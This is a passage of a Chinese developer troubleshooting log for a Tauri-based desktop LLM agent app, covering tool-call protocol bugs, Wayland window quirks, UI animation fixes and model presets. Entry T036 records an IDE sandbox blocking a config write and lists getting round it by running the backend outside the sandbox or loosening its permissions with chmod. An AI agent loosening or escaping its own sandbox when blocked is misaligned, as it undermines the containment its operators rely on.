LLM 决定调用工具时，`message.content` 是 `null`（不是空字符串），第一版代码 `text = msg["content"]` 会报 TypeError。

**根因**：
OpenAI 协议规定：当 LLM 返回 tool_calls 时，content 字段可以是 null。不能假定它一定是字符串。

**解决方案**：
```python
text = msg.get("content") or ""  # None → ""
```
同时在构造 assistant 消息回传给 LLM 时，只在 content 非空时才加 `content` 字段：
```python
assistant_msg = {"role": "assistant"}
if resp.text:
    assistant_msg["content"] = resp.text
if resp.tool_calls:
    assistant_msg["tool_calls"] = resp.tool_calls
```
避免把 `"content": null` 写进对话历史导致下次调用 LLM 报错。

文件：`src/lihua/router.py` 和 `src/lihua/agent.py`。

---

### T032: tool 消息必须带 `tool_call_id` 否则 LLM 报 400

**现象**：
Agent 主循环执行完工具后，把结果作为 `role: tool` 消息回传给 LLM，LLM 返回 HTTP 400 "tool message must have tool_call_id"。

**根因**：
OpenAI 协议要求 tool 消息必须关联到具体的 tool_call，通过 `tool_call_id` 字段。第一版只写了 `role` 和 `content`，没写 `tool_call_id`。

**解决方案**：
```python
messages.append({
    "role": "tool",
    "tool_call_id": tc.get("id", ""),  # 必须带
    "name": tool_name,
    "content": result_text,
})
```
`tool_call_id` 从 LLM 上一次返回的 tool_calls[i].id 取。

文件：`src/lihua/agent.py` 的 `run_agent()` 主循环。

---

### T033: GNOME Wayland 下窗口透明 + 全局快捷键不工作

**现象**：
- Tauri 2.0 设置 `transparent: true` 后，GNOME Wayland 下窗口仍是黑色矩形，看不到桌面
- 全局快捷键 `Ctrl+Alt+L` 在 GNOME Wayland 下完全无响应（Wayland 不支持 X11 的全局快捷键机制）

**根因**：
- GNOME Mutter 合成器对 Wayland 客户端窗口透明支持不完整，需要 compositor 主动支持，且不同发行版行为不一致
- Wayland 协议本身不支持应用注册全局快捷键（X11 的 `XGrabKey` 在 Wayland 下失效），需要通过 `org.gnome.Shell` DBus 接口或 GNOME 扩展

**解决方案**：
- 牺牲真透明，保视觉层次：窗口底色用 `rgba(28, 28, 30, 0.82)` + 内部用 `backdrop-filter: blur(40px) saturate(180%)` 模拟毛玻璃层次，即使不透明也能呈现 macOS Sequoia 暗色质感
- 全局快捷键暂时无效：托盘图标 + 点击即可显示窗口，Wayland 下可在系统设置里手动绑定 `lihua gui` 命令到自定义快捷键
- 文档注明已知限制，避免用户困惑

文件：`desktop/src-tauri/tauri.conf.json`（窗口配置）+ `desktop/src/index.css`（毛玻璃 CSS）+ `desktop/src-tauri/src/lib.rs`（托盘菜单）

---

### T034: Vite 多入口配置残留导致 tauri dev 找不到 bubble 入口

**现象**：
```
npm error could not determine executable to run
```
或 `tauri dev` 启动后浏览器报 404 找不到 bubble.html。

**根因**：
v0.3.0 时代的 `desktop/vite.config.ts` 配置了 rollupOptions 多入口（main + bubble），v0.7.0 删除 Bubble 相关文件后，vite 仍按多入口构建，找不到 bubble.html 入口。

**解决方案**：
重写 `desktop/vite.config.ts`，移除 rollupOptions 多入口配置，改为单入口：
```typescript
export default defineConfig({
  plugins: [react()],
  clearScreen: false,
  server: {
    port: 5173,
    strictPort: true,
    proxy: { '/api': 'http://127.0.0.1:7531' },
  },
  // 不再配置 build.rollupOptions.input，让 vite 用默认 index.html 入口
})
```

同时检查 `desktop/src-tauri/tauri.conf.json` 的 `build.devUrl` 指向 `http://localhost:5173`，`build.frontendDist` 指向 `../dist`。

文件：`desktop/vite.config.ts` + `desktop/src-tauri/tauri.conf.json`

---

### T035: `lihua gui` 命令被 `__main__.py` 预处理误识别（v0.3 已修，v0.7 需复查）

**现象**：
执行 `lihua gui --dev` 后报 `lihua：未找到命令` 或 `npm error could not determine executable to run`。

**根因**：
- PATH 未包含 `~/.local/bin`，导致 shell 找不到 `lihua` 命令
- 即使 PATH 正确，`lihua gui --dev` 内部用 `os.execvp("npx", ["npx", "tauri", "dev"])`，但某些环境下 npx 找不到 `@tauri-apps/cli`

**解决方案**：
- PATH 问题：直接用 venv 内的 lihua：`~/.local/share/lihua/venv/bin/lihua gui --dev`
- npx 问题：改用本地 `./node_modules/.bin/tauri dev`，绕过 npx 解析
  ```bash
  cd desktop && ./node_modules/.bin/tauri dev
  ```

文件：`src/lihua/cli.py` 的 `gui()` 函数（dev 模式分支）

---

### T036: Trae sandbox 写 `~/.config/lihua/config.toml` 权限被拒

**现象**：
通过 curl 调用 `POST /api/config/llm/preset/zhipu` 报错：
```
{"ok": false, "error": "保存配置失败：[Errno 13] Permission denied: '/home/vitasguo/.config/lihua/config.toml'"}
```

**根因**：
Trae IDE 的 sandbox 限制了对 `~/.config/` 目录的写入权限。`Config.save()` 调用 `path.write_text()` 时被沙箱拦截。

**解决方案**：
- 在 Trae sandbox 外运行后端：`~/.local/share/lihua/venv/bin/python -m lihua.server` 或直接 `lihua gui`
- 实际部署到用户机器后没有 sandbox 限制，问题自动消失
- 测试时可用 `chmod` 临时放宽 sandbox 测试目录权限，或在 Settings → Conversation → Custom Sandbox Configuration 添加规则

文件：`src/lihua/config.py` 的 `Config.save()` 方法

---

### T037: Sidebar 双向动画实现（避免 mount/unmount 导致的跳变）

**现象**：
v0.7.0 用 `{sidebarOpen && <Sidebar />}` 实现侧栏，关闭时直接 unmount，没有滑出动画，主内容区跳变。

**根因**：
React 条件渲染 `{cond && <Component />}` 在 cond 变为 false 时立即移除 DOM，没有 transition 机会。

**解决方案**：
始终 mounted，用 width + opacity transition 控制：
```tsx
<aside
  className={[
    'transition-[width,opacity] duration-base ease-out-soft',
    'overflow-hidden',
    open ? 'w-72 opacity-100' : 'w-0 opacity-0',
  ].join(' ')}
>
  <div className="w-72 h-full flex flex-col">
    {/* 内容固定宽度，避免缩放期变形 */}
  </div>
</aside>
```

关键点：
- 外层 aside 控制宽度（0 → 288px），overflow-hidden
- 内层 div 固定 w-72，避免内容在缩放期被挤压变形
- 主内容区用 flex-1，自动跟随收缩

文件：`desktop/src/components/Sidebar.tsx`

---

### T038: ModelSheet `fixed inset-0` 跑出主界面外（v0.7.2 修复）

**现象**：
用户反馈「模型设置界面怎么跑出主界面之外了？感觉体验有点割裂」。

ModelSheet 用 `position: fixed` + `inset-0` 定位，弹窗时覆盖整个浏览器视口（在 Tauri 中是整个桌面），脱离了主窗口容器，视觉上「飞出」了主窗口。

**根因**：
`fixed` 定位相对浏览器视口，而非父容器。在 Tauri 单窗口架构中，主窗口只是一个 720×640 的卡片（外层 `p-3`），`fixed` 的 Sheet 会覆盖整个窗口而不是相对主窗口定位。

**解决方案**：
改为 `absolute inset-0`，相对最近的 positioned 父容器定位。父容器（主窗口的 `window-glass` div）需要是 `relative`（实际上 `overflow-hidden` + `flex flex-col` 已满足）。

```tsx
// 之前（v0.7.1）：
<div className="fixed inset-0 z-40 ...">
  <div className="animate-slide-right h-full w-full ...">
</div>

// 之后（v0.7.2）：
<div className="absolute inset-0 z-40 flex flex-col justify-end animate-fade-in">
  <div className="animate-slide-up h-full w-full ...">
</div>
```

动画从 `slide-right`（右侧滑入）改为 `slide-up`（从底部滑上），更符合「主窗口内浮层」的交互模式。

文件：`desktop/src/components/ModelSheet.tsx`

---

### T039: WelcomeScreen 缺少 flex-1 导致无 sidebar 时左对齐（v0.7.2 修复）

**现象**：
用户反馈「没有 sidebar 的时候内容显示为什么不居中？」

关闭 sidebar 时，主内容区（WelcomeScreen）的内容显示在窗口左侧，右侧留大片空白，视觉不平衡。

**根因**：
App.tsx 主内容区是 flex 行容器：
```tsx
<div className="flex-1 flex overflow-hidden">
  {messages.length === 0 ? <WelcomeScreen /> : <MessageList />}
  <Sidebar open={sidebarOpen} ... />
</div>
```

- `MessageList` 有 `flex-1` 类 → 占满剩余宽度，内容居中
- `WelcomeScreen` 只有 `h-full flex flex-col items-center` → **没有 flex-1**，在 flex 行容器里取自然宽度（约 480px），默认 `justify-start` 左对齐

结果：sidebar 关闭时，WelcomeScreen 占据左侧 480px，右侧 200+px 空白。

**解决方案**：
给 WelcomeScreen 外层加 `flex-1`，让它占满剩余宽度，内部 `items-center` 才能真正居中：
```tsx
<div className="flex-1 h-full flex flex-col items-center justify-center ...">
```

同时给 MessageList 内容包 `max-w-[640px] mx-auto`，InputBar 外层也加 `max-w-[640px] mx-auto w-full`，保证三者在宽屏下都居中在 640px 列内，对齐一致。

文件：`desktop/src/components/WelcomeScreen.tsx` + `MessageList.tsx` + `InputBar.tsx`

---

### T040: 模型清单过时（v0.7.2 修复）

**现象**：
用户反馈「你是不是没有看各家最新的模型？都是老黄历模型了」。

v0.7.1 的 model_presets.py 用了即将停用或非最新的模型 ID：
- `deepseek-chat`（DeepSeek 即将停用，应改用 V4 系列）
- `moonshot-v1-8k`（Kimi 旧版，应改用 K2.6 / K3）
- `abab6.5s-chat`（MiniMax 非最新，应改用 M2.7）
- `glm-4-flash`（智谱旧 ID，应改用 `glm-4-flash-250414` 或 `glm-4.5-flash`）

**根因**：
预设清单是 v0.7.1 初版写的，当时没核对各家厂商最新模型，直接用了记忆中的旧 ID。

**解决方案**：
1. 通过 WebSearch 查询 5 家厂商（智谱 / DeepSeek / Kimi / MiMo / MiniMax）2026-07 最新模型清单
2. 重写 `src/lihua/model_presets.py`：
   - 新增 `ModelOption` dataclass，含 `tier`（basic/pro）和 `is_free` 字段
   - `ModelPreset.models` 从 `list[str]` 改为 `list[ModelOption]`
   - `default_model` 字段改名为 `recommended_model`
3. 6 个预设按免费优先排序：智谱（GLM-4-Flash 完全免费！）排第一
4. 后端 `apply_preset` API 支持 body 选择具体 `model_id`
5. 前端 ModelSheet 按 tier 分组显示（基础模型 / Pro 旗舰）+ 免费徽章

文件：`src/lihua/model_presets.py` + `src/lihua/server.py` + `desktop/src/api.ts` + `desktop/src/components/ModelSheet.tsx`

---

### T041: LihuaLogo 连续 3 次被用户嫌弃「不可爱」（v0.7.3 修复尝试）

**现象**：
用户对 Logo 设计连续 3 轮反馈不满意：
- v0.7.1（几何化尖耳朵 + 圆润下颌 + 杏仁眼 + M 形嘴 + 4 根胡须）：用户原话「猫头太丑了，乍一看有点像猪」
- v0.7.2（盾形脸 + 高耸尖耳朵 + 内耳小三角 + 水滴形杏仁眼 + ω 形嘴 + 4 根胡须）：用户原话「太丑了，不可爱」
- v0.7.2（盾形脸重做版）：用户原话「狸花猫的图标甚至不如第一版的 emoji。。。算了，感觉你的能力到这里了」

**根因**：
1. **AI 生成 SVG 几何路径难以表达「可爱」**：盾形脸、尖耳朵、杏仁眼这些「特征叠加」反而让猫头显得严肃、工程化，缺乏手绘 emoji 的圆润感和亲和力
2. **过多细节反而显丑**：4 根胡须 + ω 嘴 + 内耳小三角，元素太多视觉杂乱
3. **没有参考真实可爱猫 IP 的设计语言**：Pusheen / Hello Kitty / Hello Kitty 等知名可爱猫 IP 都是「纯圆形构图 + 极简五官」，而非几何化尖角

**解决方案（v0.7.3 第三次重做）**：
彻底改为纯圆形构图，参考 Pusheen 风格：
```tsx
<svg viewBox="0 0 24 24" strokeWidth={1.8}>
  <circle cx="6.5" cy="7" r="2.8" />     {/* 左耳：小圆 */}
  <circle cx="17.5" cy="7" r="2.8" />    {/* 右耳：小圆 */}
  <circle cx="12" cy="14" r="7" />        {/* 头：大圆 */}
  <circle cx="9.5" cy="13" r="1.1" fill="currentColor" stroke="none" />   {/* 左眼：实心圆点 */}
  <circle cx="14.5" cy="13" r="1.1" fill="currentColor" stroke="none" />  {/* 右眼：实心圆点 */}
  <path d="M 11.2 15.5 L 12.8 15.5 L 12 16.5 Z" fill="currentColor" stroke="none" />  {/* 鼻：小倒三角 */}
  <path d="M 9.5 17.2 Q 12 18.8 14.5 17.2" />  {/* 嘴：单一微笑弧线 */}
</svg>
```

关键设计决策：
- 纯圆形（圆头 + 圆耳朵）→ 像 Pusheen / Hello Kitty
- 圆点眼睛（实心，不是描边杏仁形）→ 更萌
- 单一微笑弧线（不是 ω 形两弧）→ 简单干净
- 完全去掉胡须 → 不杂乱
- 描边 1.8（比 v0.7.2 的 1.6 略粗）→ 更醒目

**教训**：
- AI 做 SVG logo 不要堆叠「特征」，越简化越容易可爱
- 参考成熟 IP 的设计语言（Pusheen / Hello Kitty 都是纯圆形 + 极简五官）
- 用户对 Logo 的反馈是高度主观的，连续 3 次不满意时应当：
  1. 承认设计能力上限
  2. 提供多个备选方案让用户选
  3. 或直接用现成的 lucide-react 图标（如 Cat）让用户少踩坑

文件：`desktop/src/components/LihuaLogo.tsx`

---

### T042: ModelSheet v0.7.2 信息过载（被用户反馈「大阵仗」）

**现象**：
用户原话「这个模型设置需要搞这么大的阵仗吗？我是用户填个token选个模型就行了。感觉你没有领会精致的感觉」。

v0.7.2 的 ModelSheet 包含：
- 6 个预设卡片 2 列网格（每张卡片显示厂商名 + 描述 + docs_note）
- tier 分组独立区（基础模型 / Pro 旗舰两栏）
- 免费徽章（Gift 图标）
- 上下文长度（128K / 1M 等数字）
- 当前状态卡片
- 描述卡片
- 获取 API Key 链接 + custom 模式输入

总共 7 个区块、上百行 JSX，对「挑剔的懒人」来说信息过载。

**根因**：
1. **错误估计用户画像**：把用户当成「需要了解每个模型细节才能决策」的极客，实际用户是「挑剔的懒人，不在乎花钱，只要最好的体验」
2. **过度展示信息**：tier 分组 + 免费徽章 + 上下文长度 + 描述卡片，这些信息对懒人用户没意义（懒人只关心「哪个最好」和「能不能用」）
3. **决策路径太长**：用户需要：选预设卡片 → 看详情 → 选 tier → 选具体模型 → 填 API Key → 保存，6 步才能完成。应该缩短为 3 步：选厂商 → 选模型（默认旗舰）→ 填 API Key

**解决方案（v0.7.3 极简化重写）**：
完全重写为 5 个区块：
1. 厂商 segmented control（一行排开，iOS 风格按钮）
2. 模型原生 `<select>` 下拉（选项后缀「（旗舰）/ · 免费」标识，默认选推荐旗舰）
3. API Key 输入（带显隐 + 获取链接）
4. 底部能力下限警告条（固定黄色）
5. 保存按钮

去掉的内容：
- ❌ 6 个预设卡片 2 列网格（换成 segmented control）
- ❌ tier 分组独立区（合并进 select 选项后缀）
- ❌ 免费徽章（合并进 select 选项后缀）
- ❌ 上下文长度数字（懒人不在乎）
- ❌ 当前状态卡片（保存后看主界面状态栏即可）
- ❌ 描述卡片（保留 select 下方一行小字描述）

决策路径从 6 步缩短为 3 步：选厂商 → 选模型（默认旗舰，一般无需改）→ 填 API Key

**教训**：
- 「精致」≠「信息丰富」，精致是「最少的信息 + 最优的默认值」
- 挑剔的懒人用户画像：不在乎钱、要最好、最少操作、最少决策
- 默认值要敢选最贵最好的，不要默认免费版（用户会自己降级，不会自己升级）
- segmented control + select 是 iOS / macOS 原生交互模式，比卡片网格更符合「精致」感

文件：`desktop/src/components/ModelSheet.tsx`

---

### T043: 默认推荐免费模型不符合「挑剔的懒人不在乎花钱」的用户画像

**现象**：
用户原话「感觉你没有把用户当成挑剔的懒人，并且是不在乎花钱的人。完全可以默认用最贵的模型」。

v0.7.2 的 `recommended_model` 全部选了免费或基础模型：
- 智谱 → `glm-4-flash-250414`（免费）
- DeepSeek → `deepseek-v4-flash`（经济）
- Kimi → `kimi-k2.6`（开源免费）
- MiMo → `mimo-v2.5`（基础）
- MiniMax → `abab6.5s-chat`（基础）

**根因**：
开发者默认思维「省钱 = 友好」，但用户画像明确是「不在乎花钱、要最好体验」。推荐免费版反而让用户觉得「你在劝我省钱，但我要的是最好的」。

**解决方案**：
所有 5 个厂商的 `recommended_model` 改为 pro 旗舰：
```python
ModelPreset(id="zhipu", ..., recommended_model="glm-5.2", ...),
ModelPreset(id="deepseek", ..., recommended_model="deepseek-v4-pro", ...),
ModelPreset(id="kimi", ..., recommended_model="kimi-k3", ...),
ModelPreset(id="mimo", ..., recommended_model="mimo-v2.5-pro", ...),
ModelPreset(id="minimax", ..., recommended_model="MiniMax-M2.7", ...),
```

同时新增能力下限警告：
```python
MIN_RECOMMENDED_MODEL = "deepseek-v4-flash"
MIN_RECOMMENDED_WARNING = (
    "不建议使用能力低于 DeepSeek V4 Flash 的模型，否则 Agent 可能无法正确调用工具，"
    "导致任务失败或执行错误命令。"
)
```

ModelSheet 底部固定黄色警告条展示此文案，AlertTriangle 图标提示用户「再往下降有风险」。

**教训**：
- 用户画像决定默认值策略：省钱用户 → 默认免费版 + 升级提示；挑剔懒人 → 默认旗舰 + 降级警告
- 「明确警告不要降级」比「含糊推荐升级」更直接：用户看到「不建议使用能力低于 X 的模型」会主动避免降级
- Agent 模式对模型能力有下限要求（function calling 需要足够强的模型），明确这个下限避免用户选错模型导致功能失效

文件：`src/lihua/model_presets.py` + `desktop/src/components/ModelSheet.tsx`

---

### T044: Tauri WebView 下原生 `<select>` 白底白字

**现象**：
用户反馈「选模型的界面是白底白字吗？还是黑底黑字。我看web里面是黑的，Gui运行的是白的。估计调用ubuntu原生的下拉菜单了。好丑。有字吗？至少我没看到字」。

Web 浏览器（Chrome）下 `<select>` 下拉显示正常（暗色主题），但 Tauri WebView 下下拉列表变成白底白字，在暗色主界面上完全看不见选项。

**根因**：
原生 `<select>` 元素的**下拉列表部分**（`<option>` 项）由操作系统/浏览器引擎渲染，**不受网页 CSS 控制**。

- Web 浏览器（Chrome/Firefox）：根据 `color-scheme: dark` 渲染暗色下拉列表
- Tauri WebView（Linux WebKitGTK）：忽略 `color-scheme`，用系统 GTK 主题默认渲染（Ubuntu 默认是亮色 Adwaita），所以下拉列表是白底

`<select>` 本身的样式（闭合状态）可以自定义，但**展开后的 `<option>` 列表无法用 CSS 完全控制**——这是 HTML 规范的限制。

**解决方案**：
完全自绘下拉菜单，不用原生 `<select>`：
```tsx
<div className="relative" ref={dropdownRef}>
  <button onClick={() => setOpen(!open)}>
    {selected?.name}
    <ChevronDown className={open ? 'rotate-180' : ''} />
  </button>
  {open && (
    <div className="absolute z-50 top-full left-0 right-0 mt-1 bg-bg-secondary border ...">
      {options.map(opt => (
        <button onClick={() => { setValue(opt.id); setOpen(false) }}>
          {opt.name}
          {active && <Check />}
        </button>
      ))}
    </div>
  )}
</div>
```

关键点：
1. 外层 `<div ref={dropdownRef}>` 用于"点击外部关闭"判断
2. 弹层用 `absolute z-50 top-full` 定位在下拉按钮下方
3. `useEffect` 监听 `mousedown` 事件，如果点击不在 `dropdownRef.current` 内部就 `setOpen(false)`
4. ESC 键优先关闭下拉，再关闭整个面板
5. 选中态用 `bg-accent-soft text-accent` + `Check` 图标

**教训**：
- Tauri WebView ≠ Web 浏览器：WebKitGTK 在 Linux 下对 `color-scheme`、`<select>` 暗色主题的支持很弱
- 任何需要暗色主题的桌面应用，**自绘下拉菜单是唯一可靠方案**
- 不要相信"浏览器能渲染对，Tauri 也能"——WebKitGTK 是另一套渲染引擎

文件：`desktop/src/components/ModelSheet.tsx`

---

### T045: ModelSheet 退出无动画导致残影

**现象**：
用户反馈「最搞的是退出模型选择界面竟然有残影」。

v0.7.3 的 ModelSheet 关闭流程：
```tsx
if (!open) return null  // 直接 unmount，没有退出动画
```

关闭时遮罩 + sheet 瞬间消失，视觉上感觉"有残影"——其实是动画不一致的视觉错觉（入场有 `animate-slide-up`，退场突然消失）。

**根因**：
React 的 `open=false → return null` 是同步 unmount，浏览器来不及播放退出动画，元素直接被移除。这导致：
- 入场动画明显（slide-up 240ms）
- 退场无动画（0ms，瞬间消失）
- 视觉不对称 → 感觉"卡了一下"或"有残影"

**解决方案**：
引入 `closing` 状态 + `prevOpenRef` 跟踪上一次 open：
```tsx
const [closing, setClosing] = useState(false)
const prevOpenRef = useRef(false)
const shouldRender = open || closing

useEffect(() => {
  const prevOpen = prevOpenRef.current
  prevOpenRef.current = open
  if (open) {
    setClosing(false)  // 打开：重置退出状态
  } else if (prevOpen) {
    // 从开变关：触发退出动画
    setClosing(true)
    const t = setTimeout(() => setClosing(false), EXIT_ANIM_MS)
    return () => clearTimeout(t)
  }
}, [open])

// 渲染时根据 closing 切换动画类
const overlayAnim = closing ? 'animate-fade-out' : 'animate-fade-in'
const sheetAnim = closing ? '' : 'animate-slide-up'
```

关键点：
1. `prevOpenRef` 初值 `false`，避免组件初始 mount（open=false）时误触发退出动画
2. `shouldRender = open || closing` 让 closing 期间组件继续渲染
3. closing=true 时遮罩播 `animate-fade-out`，sheet 不播任何动画（已经滑到位了，再滑多余）
4. 150ms 后 setClosing(false) → shouldRender=false → return null → 真正 unmount

`handleClose` 统一调 onClose（让父组件 setOpen(false)），useEffect 监听 open 变化自动启动退出动画，避免双计时器。

**教训**：
- 任何 modal/sheet/dialog 都应该有对称的入场+退场动画
- React 的 `open && <Component />` 模式天然不支持退出动画，必须用 `closing` 状态延迟 unmount
- `prevOpenRef` 模式是检测"从开变关"的标准做法，避免初始 mount 误触发

文件：`desktop/src/components/ModelSheet.tsx` + `desktop/src/components/LogoSheet.tsx`（共用模式）

---

### T046: 托盘菜单「设置」「审计日志」emit 事件未被前端监听

**现象**：
用户反馈「状态栏的按钮入口很多选项点了都没效果啊？是没做吗？」。

托盘菜单的「设置」「查看审计日志」两个菜单项点击后，主窗口会显示，但没有任何对应的事情发生（不会打开 ModelSheet，不会显示审计日志）。

**根因**：
`desktop/src-tauri/src/lib.rs` 的托盘菜单事件处理：
```rust
"settings" => {
    let _ = app.emit("open-settings", ());
    show_main_window(app);
}
"audit" => {
    let _ = app.emit("open-audit", ());
    show_main_window(app);
}
```

Rust 端 emit 了 `open-settings` 和 `open-audit` 事件，但 `desktop/src/App.tsx` 只监听了：
```tsx
listen('new-chat', ...)      // ✅ 新对话
listen('open-history', ...)  // ✅ 查看 history
// ❌ 没监听 open-settings
// ❌ 没监听 open-audit
```

事件 emit 了但没人 listen，等于白 emit。

**解决方案**：
App.tsx 补齐监听：
```tsx
const openSettingsP = listen('open-settings', () => {
  setModelSheetOpen(true)
})
const openAuditP = listen('open-audit', () => {
  // 暂时打开 Sidebar 历史 tab
  // TODO v0.7.5+: 做独立 AuditSheet 显示 ~/.local/share/lihua/audit.log
  setSidebarOpen(true)
  api.history().then(r => setHistory(r.entries)).catch(() => {})
})
```

**教训**：
- Tauri 事件系统是 emit-listen 模式，emit 了但没 listen 等于静默失败（不会报错）
- 加托盘菜单项时，**必须同时**：1) Rust 端 emit 事件；2) 前端 listen 事件
- 后端 `lib.rs` 和前端 `App.tsx` 是两个独立模块，事件名是它们的唯一契约，加新事件必须两端同步

文件：`desktop/src/App.tsx`

---

### T047: Wayland 下窗口透明不生效，方形硬边

**现象**：
用户反馈「Gui 主界面边上的透明度渐变遮罩好像没有起作用，一个方形的界面」。

v0.7.0 设计的 `window-glass` 类用 `rgba(28,28,30,0.82)` + `backdrop-filter: blur(40px)` 期望实现毛玻璃效果，窗口边缘通过外层 `p-3` padding 露出桌面。但实际在 GNOME Wayland 下：
- 窗口呈现方形硬边（圆角不生效）
- 窗口周围 3px padding 区域是黑色（不是透明）
- 整体看起来像"一个方形黑卡片"，没有 macOS 那种透明柔和过渡

**根因**：
Tauri 2.0 在 GNOME Wayland 下：
1. `transparent: true` 配置在 Mutter 下不被支持（Wayland 协议限制）
2. `decorations: false` 生效（无标题栏），但窗口本身仍是矩形
3. CSS 的 `border-radius` 对 webview 内容生效，但**对窗口本身的形状不生效**（窗口仍是矩形，矩形的 webview 容器边界是硬边）
4. `backdrop-filter` 依赖窗口后面的内容（桌面），但窗口不透明时 backdrop 是黑色

**解决方案**（v0.7.4 缓解）：
在 `.window-glass` 加两层 inset 阴影模拟 vignette：
```css
.window-glass {
  background: var(--bg-window);
  backdrop-filter: blur(40px) saturate(180%);
  box-shadow:
    var(--shadow-window),
    inset 0 0 24px rgba(0, 0, 0, 0.35),   /* 边缘 24px 较深渐变，强化圆角感 */
    inset 0 0 80px rgba(0, 0, 0, 0.15);   /* 边缘 80px 柔和渐变，模拟 vignette */
}
```

效果：窗口边缘有"渐变到深"的视觉，让方形硬边看起来柔和一些。

**根本解决方案**（未来 v0.8+）：
1. 用 `wlr-layer-shell` 协议（Wayland Layer Shell）——需要 Tauri 支持或自己写 GNOME Shell 扩展
2. 用 X11 后端（XWayland）——但会失去 Wayland 的其他优势
3. 接受平台限制，把窗口设计成"方形也好看"——这是 macOS 应用在 Linux 上的普遍妥协

**教训**：
- Wayland ≠ X11：透明窗口、全局快捷键、窗口定位这些在 X11 下能用的特性，Wayland 下大多不工作
- GNOME Wayland 的 Mutter 合成器对窗口透明支持最差（KDE Wayland 好一些）
- 设计 Linux 桌面应用时，**永远假设窗口是矩形不透明的**，把视觉重点放在窗口内部，而不是依赖窗口透明效果
- `inset box-shadow` 是模拟 vignette 的低成本方案，虽然不如真透明好看，但跨平台一致

文件：`desktop/src/index.css`

---

### T048: GUI 四周 vignette 渐变遮罩不跟圆角

**现象**：
用户反馈「Gui 四周的透明渐变的遮罩没有跟这主界面的圆角变化，一个方形的界面」。vignette 内阴影看起来是矩形而非圆角，整体窗口看起来是方形硬边。

**根因**：
v0.7.4 的 App.tsx 外层有 `p-3`（12px padding）：
```tsx
<div className="h-screen w-full flex items-center justify-center p-3">
  <div className="window-appear window-glass w-full h-full max-w-[720px] rounded-2xl ...">
```

外层 p-3 留了 12px 边距，意味着 .window-glass 和窗口边缘有 12px 间隙。这间隙在透明窗口下应该是桌面包透出来的，但 Wayland Mutter 不支持真透明，所以这 12px 是黑色矩形！

`.window-glass` 本身的 `rounded-2xl` + `box-shadow inset` 都正确跟随圆角裁剪，但被外层的 12px 黑色矩形包围，视觉上整体看起来是方形。

**解决方案**：
1. 去掉外层 `p-3`，让 `.window-glass` 占满整个窗口
2. 新增 `.window-outer` 类，加 `border-radius: 16px` + `overflow: hidden`，让 webview 内圆角外区域完全不渲染
3. `.window-glass` 加 4 层 inset shadow 强化圆角感：
   - `inset 0 1px 0 rgba(255,255,255,0.10)` 顶部 1px 高光线
   - `inset 0 0 0 1px rgba(255,255,255,0.06)` 整体 1px 内边框
   - `inset 0 0 32px rgba(0,0,0,0.30)` 边缘 32px 深渐变
   - `inset 0 0 120px rgba(0,0,0,0.12)` 边缘 120px 柔和渐变（vignette）

```css
.window-outer {
  border-radius: 16px;
  overflow: hidden;
  will-change: transform;
  transform: translateZ(0);
  contain: layout paint;
}

.window-glass {
  background: var(--bg-window);
  backdrop-filter: blur(40px) saturate(180%);
  border-radius: 16px;
  box-shadow:
    var(--shadow-window),
    inset 0 1px 0 rgba(255, 255, 255, 0.10),
    inset 0 0 0 1px rgba(255, 255, 255, 0.06),
    inset 0 0 32px rgba(0, 0, 0, 0.30),
    inset 0 0 120px rgba(0, 0, 0, 0.12);
  will-change: transform, backdrop-filter;
  transform: translateZ(0);
}
```

**教训**：
- Wayland 下窗口外形 = webview 外形，不要在 webview 内留 padding 让窗口背景露出
- `.window-outer` + `overflow: hidden` + `border-radius` 是让窗口外形圆角的低成本方案
- vignette 用多层 inset shadow 比单层更精致（高光线 + 边框 + 深渐变 + 柔和渐变）

文件：`desktop/src/App.tsx` + `desktop/src/index.css`

---

### T049: ModelSheet / LogoSheet 圆角不一致（顶部圆底部方）

**现象**：
用户反馈「模型选择界面也是只有上面两个是圆角，下面两个角又是方的」。ModelSheet 和 LogoSheet 的 sheet 容器用了 `rounded-t-2xl`（只圆顶部），底部方角，看起来不一致。

**根因**：
v0.7.4 的 sheet 容器：
```tsx
<div className={`${sheetAnim} w-full bg-bg-secondary flex flex-col overflow-hidden rounded-t-2xl`}>
```

`rounded-t-2xl` 只圆顶部，底部是直角。这是 macOS Sheet 风格的标准做法（sheet 从底部滑上来贴底部，底部方角）。但用户期望四角都圆角，看起来更精致。

**解决方案**：
1. `rounded-t-2xl` → `rounded-2xl`（四角都圆角）
2. overlay 加 `p-3`（padding 12px），让 sheet 与窗口边缘留 12px 边距，"漂浮"在窗口内（类似 macOS Big Sur 后的 Sheet 风格）
3. 加 `shadow-popover` 强化漂浮感

```tsx
<div className={`absolute inset-0 z-40 flex flex-col justify-end p-3 ${overlayAnim}`}>
  <div className={`${sheetAnim} w-full bg-bg-secondary flex flex-col overflow-hidden rounded-2xl shadow-popover`}>
```

**教训**：
- macOS Sheet 风格在 Linux 下不一定合适：贴底部 + 顶部圆角在 Wayland 方形窗口下看起来割裂
- 四角圆角 + 漂浮边距更精致，且与主窗口圆角呼应
- 所有 sheet 类组件（ModelSheet / LogoSheet / ConfirmSheet）圆角风格应统一

文件：`desktop/src/components/ModelSheet.tsx` + `desktop/src/components/LogoSheet.tsx`

---

### T050: WebKitGTK GPU 加速默认未启用

**现象**：
用户反馈「能不能开启GPU加速这个GUI啊」。Tauri Linux 用 WebKitGTK 渲染，动画卡顿、滚动不流畅。

**根因**：
WebKitGTK 默认可能未启用 GPU 合成层。关键环境变量：
- `WEBKIT_DISABLE_COMPOSITING_MODE=0` 启用 GPU 合成层（默认 1 禁用）
- `WEBKIT_DISABLE_DMABUF_RENDERER=0` 启用 dmabuf 渲染器（更高效的 GPU 路径）

如果不设置，WebKitGTK 用软件渲染，动画卡顿。

**解决方案**：
在 `lib.rs` 的 `run()` 函数开头设置环境变量（必须在 Tauri Builder 之前）：
```rust
pub fn run() {
    // v0.7.5: WebKitGTK GPU 加速
    if std::env::var("WEBKIT_DISABLE_COMPOSITING_MODE").is_err() {
        std::env::set_var("WEBKIT_DISABLE_COMPOSITING_MODE", "0");
    }
    if std::env::var("WEBKIT_DISABLE_DMABUF_RENDERER").is_err() {
        std::env::set_var("WEBKIT_DISABLE_DMABUF_RENDERER", "0");
    }
    tauri::Builder::default()
        ...
}
```

用 `is_err()` 检查：只在用户未显式设置时才设默认值，允许用户通过环境变量覆盖。

**CSS 层配合**：
```css
.window-glass {
  will-change: transform, backdrop-filter;
  transform: translateZ(0);  /* 强制创建合成层 */
}
```

`translateZ(0)` 强制元素提升为合成层，让动画走 GPU 而非 CPU 软件渲染。

**注意事项**：
- Wayland + NVIDIA 专有驱动下 dmabuf 渲染器可能黑屏，需切换回 X11 或禁用 dmabuf
